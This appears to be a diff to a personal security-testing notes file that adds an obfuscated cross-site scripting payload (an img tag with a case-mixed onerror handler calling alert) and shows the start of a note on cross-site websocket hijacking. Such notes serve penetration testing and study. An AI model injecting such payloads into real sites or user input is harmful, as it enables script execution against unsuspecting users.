@@ -1,5 +1,10 @@
 # Notes
 
+### Special XSS Payload (obfuscated)
+```
+<img src=1 oNeRrOr=alert`1`>
+```
+
 ### Cross-Site Websocket Hijacking
 ```
 Works when websocket session is only identified by a static cookie or something unpredictable
